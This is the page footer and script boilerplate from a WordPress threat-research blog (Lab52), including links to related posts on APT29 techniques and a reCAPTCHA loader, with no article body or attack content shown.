href="https://lab52.io/blog/tag/svg/" rel="tag">SVG</a></span></div><div class="related-post-categories"></div></div></div><div class="related-post"><a href="https://lab52.io/blog/beyond-appearances-unknown-actor-using-apt29s-ttp-against-chinese-users/" rel="bookmark" title="Permanent Link to Beyond appearances: unknown actor using APT29&#8217;s TTP against Chinese users"><img width="400" height="222" src="https://lab52.io/blog/wp-content/uploads/2023/07/CV-maldoc-400x222.png" class="related-post-image" alt="" loading="lazy" /></a><div class="related-post-info"><a class="related-post-title" href="https://lab52.io/blog/beyond-appearances-unknown-actor-using-apt29s-ttp-against-chinese-users/" rel="bookmark" title="Permanent Link to Beyond appearances: unknown actor using APT29&#8217;s TTP against Chinese users">Beyond appearances: unknown actor using APT29&#8217;s TTP against Chinese users</a><div class="related-post-date"><time class="entry-time" itemprop="datePublished" datetime="2023-07-07T13:31:40+02:00">July 07, 2023</time></div><div class="related-post-tags"></div><div class="related-post-categories"></div></div></div><div class="related-post"><a href="https://lab52.io/blog/the-chinese-trap/" rel="bookmark" title="Permanent Link to The Chinese trap"><img width="400" height="222" src="https://lab52.io/blog/wp-content/uploads/2023/06/diagram-400x222.jpg" class="related-post-image" alt="" loading="lazy" /></a><div class="related-post-info"><a class="related-post-title" href="https://lab52.io/blog/the-chinese-trap/" rel="bookmark" title="Permanent Link to The Chinese trap">The Chinese trap</a><div class="related-post-date"><time class="entry-time" itemprop="datePublished" datetime="2023-06-08T18:39:29+02:00">June 08, 2023</time></div><div class="related-post-tags"></div><div class="related-post-categories"></div></div></div></div></div></main></div></div><div class="footer-widgets" id="genesis-footer-widgets"><h2 class="genesis-sidebar-title screen-reader-text">Footer</h2><div class="wrap"><div class="widget-area footer-widgets-1 footer-widget-area"><section id="search-4" class="widget widget_search"><div class="widget-wrap"><form class="search-form" method="get" action="https://lab52.io/blog/" role="search" itemprop="potentialAction" itemscope itemtype="https://schema.org/SearchAction"><label class="search-form-label screen-reader-text" for="searchform-1">Search this website</label><input class="search-form-input" type="search" name="s" id="searchform-1" placeholder="Search this website" itemprop="query-input"><input class="search-form-submit" type="submit" value="Search"><meta content="https://lab52.io/blog/?s={s}" itemprop="target"></form></div></section>
</div></div></div><footer class="site-footer" itemscope itemtype="https://schema.org/WPFooter"><div class="wrap"><p> <footer id="footer" class="full-width">                 <span class="small-text-footer italic">Copyright &amp;copy Lab52 2019 by <a href="https://s2grupo.es/en/home/" target="_blank">S2 Grupo</a> | <a href="/legal_note" target="_blank">Legal notice</a> | <a href="/cookie_policy" target="_blank">Cookie policy</a> | <a href="/privacy_policy" target="_blank">Privacy policy</a></span>             </footer></p></div></footer></div>			<script type="text/javascript">
				var anr_onloadCallback = function() {
					for ( var i = 0; i < document.forms.length; i++ ) {
						var form = document.forms[i];
						var captcha_div = form.querySelector( '.anr_captcha_field_div' );

						if ( null === captcha_div )
							continue;
						captcha_div.innerHTML = '';
						( function( form ) {
							var anr_captcha = grecaptcha.render( captcha_div,{
								'sitekey' : '6Lf4ZJwUAAAAAN67aD_PPXidoEzI-aIrP47hK41b',
								'size'  : 'normal',
								'theme' : 'light'
							});
							if ( typeof jQuery !== 'undefined' ) {
								jQuery( document.body ).on( 'checkout_error', function(){
									grecaptcha.reset(anr_captcha);
								});
							}
							if ( typeof wpcf7 !== 'undefined' ) {
								document.addEventListener( 'wpcf7submit', function() {
									grecaptcha.reset(anr_captcha);
								}, false );
							}
						})(form);
					}
				};
			</script>
						<script src="https://www.google.com/recaptcha/api.js?onload=anr_onloadCallback&#038;render=explicit"
				async defer>
			</script>
				<script type="text/javascript">
		function atomicBlocksShare( url, title, w, h ){
			var left = ( window.innerWidth / 2 )-( w / 2 );
			var top  = ( window.innerHeight / 2 )-( h / 2 );
			return window.open(url, title, 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width=600, height=600, top='+top+', left='+left);
		}
	</script>
	<script type="text/javascript" src="/blog/wp-content/themes/genesis-sample-develop/custom.js"></script> 
<style type="text/css" media="screen"></style><link rel='stylesheet' id='molongui-authorship-box-css'  href='https://lab52.io/blog/wp-content/plugins/molongui-authorship/assets/css/author-box.69f2.min.css?ver=4.7.4' type='text/css' media='all' />
<style id='molongui-authorship-box-inline-css' type='text/css'>
:root{ --m-a-box-bp: 600px; --m-a-box-bp-l: 599px; }.m-a-box {width:100%;margin-top:20px !important;margin-right:0 !important;margin-bottom:20px !important;margin-left:0 !important;} .m-a-box-header {margin-bottom:20px;} .m-a-box-header > :first-child,  .m-a-box-header a.m-a-box-header-url {font-size:px;line-height:px;} .m-a-box-container {padding-top:0;padding-right:0;padding-bottom:0;padding-left:0;border-style:solid;border-top-width:1px;border-right-width:0;border-bottom-width:1px;border-left-width:0;border-color:#e8e8e8;background-color:#f7f8f9;box-shadow:10px 10px 10px #ababab ;} .m-a-box-avatar img,  .m-a-box-avatar div[data-avatar-type="acronym"] {border-style:solid;border-width:2px;border-color:#bfbfbf;border-radius:%;} .m-a-box-name *  {font-size:22px;line-height:px;} .m-a-box-content.m-a-box-profile .m-a-box-data .m-a-box-meta * {font-size:12px;line-height:px;} .m-a-box-meta-divider {padding:0 0.2em;} .m-a-box-bio > * {font-size:14px;line-height:px;} .m-icon-container {background-color: inherit; border-color: inherit; color: #999999 !important;font-size:20px;} .m-a-box-related-entry-title,  .m-a-box-related-entry-title a {font-size:14px;}
</style>
<script type='text/javascript' src='https://lab52.io/blog/wp-content/plugins/atomic-blocks/dist/assets/js/dismiss.js?ver=1598525594' id='atomic-blocks-dismiss-js-js'></script>
<script type='text/javascript' id='molongui-authorship-byline-js-extra'>
/* <![CDATA[ */
var molongui_authorship_byline_params = {"byline_prefix":"","byline_suffix":"","byline_separator":", ","byline_last_separator":" and ","byline_link_title":"View all posts by","byline_link_class":"","byline_dom_tree":"","byline_dom_prepend":"","byline_dom_append":"","byline_decoder":"v3"};
/* ]]> */
</script>
<script type='text/javascript' src='https://lab52.io/blog/wp-content/plugins/molongui-authorship/assets/js/byline.334a.min.js?ver=4.7.4' id='molongui-authorship-byline-js'></script>
<script type='text/javascript' src='https://lab52.io/blog/wp-includes/js/comment-reply.min.js?ver=5.5.13' id='comment-reply-js'></script>
<script type='text/javascript' src='https://lab52.io/blog/wp-includes/js/hoverIntent.min.js?ver=1.8.1' id='hoverIntent-js'></script>
<script type='text/javascript' src='https://lab52.io/blog/wp-content/themes/genesis/lib/js/menu/superfish.min.js?ver=1.7.10' id='superfish-js'></script>
<script type='text/javascript' src='https://lab52.io/blog/wp-content/themes/genesis/lib/js/menu/superfish.args.min.js?ver=3.3.3' id='superfish-args-js'></script>
<script type='text/javascript' src='https://lab52.io/blog/wp-content/themes/genesis/lib/js/skip-links.min.js?ver=3.3.3' id='skip-links-js'></script>
<script type='text/javascript' id='genesis-sample-responsive-menu-js-extra'>
/* <![CDATA[ */
var genesis_responsive_menu = {"mainMenu":"Menu","menuIconClass":"dashicons-before dashicons-menu","subMenu":"Submenu","subMenuIconClass":"dashicons-before dashicons-arrow-down-alt2","menuClasses":{"combine":[".nav-primary"],"others":[]}};
/* ]]> */
</script>
<script type='text/javascript' src='https://lab52.io/blog/wp-content/themes/genesis-sample-develop/js/responsive-menus.min.js?ver=2.9.2-dev' id='genesis-sample-responsive-menu-js'></script>
<script type='text/javascript' src='https://lab52.io/blog/wp-content/themes/genesis-sample-develop/js/genesis-sample.js?ver=2.9.2-dev' id='genesis-sample-js'></script>
<script type='text/javascript' id='wpgdprc.js-js-extra'>
/* <![CDATA[ */
var wpgdprcData = {"ajaxURL":"https:\/\/lab52.io\/blog\/wp-admin\/admin-ajax.php","ajaxSecurity":"1f335a6398","isMultisite":"","path":"\/","blogId":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://lab52.io/blog/wp-content/plugins/wp-gdpr-compliance/assets/js/front.min.js?ver=1592813009' id='wpgdprc.js-js'></script>
<script type='text/javascript' src='https://lab52.io/blog/wp-includes/js/wp-embed.min.js?ver=5.5.13' id='wp-embed-js'></script>
<script type='text/javascript' src='https://cdn.jsdelivr.net/npm/css-element-queries@1.2.2/src/ResizeSensor.min.js?ver=1.2.2' id='molongui-resizesensor-js'></script>
<script type='text/javascript' src='https://cdn.jsdelivr.net/npm/css-element-queries@1.2.2/src/ElementQueries.min.js?ver=1.2.2' id='molongui-elementqueries-js'></script>
<div data-m-brand="Molongui" data-m-id="Authorship" data-m-license="Lite" data-m-version="4.7.4" data-m-link="https://www.molongui.com/authorship/"></div></body></html>

<!-- Dynamic page generated in 1.863 seconds. -->
<!-- Cached page generated by WP-Super-Cache on 2024-01-01 13:07:04 -->

<!-- super cache -->